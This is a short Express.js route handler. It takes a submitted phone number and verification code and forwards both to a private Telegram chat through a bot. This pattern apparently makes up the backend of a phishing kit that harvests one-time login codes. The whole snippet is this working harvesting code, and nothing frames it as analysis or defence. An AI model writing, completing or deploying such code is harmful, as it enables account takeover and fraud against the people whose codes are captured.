app.post("/send", async (req, res) => {
    const { phone, verify } = req.body;

    if (!phone || !verify) {
        return res.status(400).json({ error: "Missing fields" });
    }

    const text = `📱 NEW SUBMISSION:

Phone: ${phone}
Verification Code: ${verify}
`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text
        });

        res.json({ success: true });
    } catch (error) {
        console.error("Telegram Error:", error);
        res.status(500).json({ error: "Telegram failed" });
    }
});

